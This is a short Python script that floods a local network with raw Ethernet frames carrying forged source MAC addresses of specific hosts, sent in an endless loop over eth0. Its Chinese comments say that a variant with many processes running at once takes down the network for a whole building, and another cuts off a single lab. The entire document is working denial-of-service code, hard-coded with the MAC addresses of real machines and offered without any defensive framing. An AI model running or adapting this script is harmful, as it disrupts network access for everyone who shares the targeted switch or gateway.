#!/usr/bin/python
#encoding:UTF-8
import socket
import struct

gw='\x00\x1a\xa9\x17\x83\xe5'
zzy='\x44\x8a\x5b\xea\xb7\xf3'
master='\x44\x8a\x5b\xea\xb7\x25'
node1='\x40\xa8\xf0\x01\xb2\x52'
node2='\x44\x8a\x5b\xea\xb7\xea'
mq='\xfc\xaa\x14\x4a\x9c\x5f'

def send():
    rawSocket=socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))

    rawSocket.bind(("eth0", socket.htons(0x0800)))
    """
	实现全楼断网,需要大量的进程同时运行
	packet=struct.pack("6s6s2s", master, gw, '\x08\x00')

	实现本机实验室断网,需要一定量的进程同时运行
	packet=struct.pack("6s6s2s", zzy, gw, '\x08\x00')
        目标MAC      源MAC
    """
    packet=struct.pack("6s6s2s", node1, master, '\x08\x00')

    rawSocket.send(packet+"00000000")

while 1:
    send()
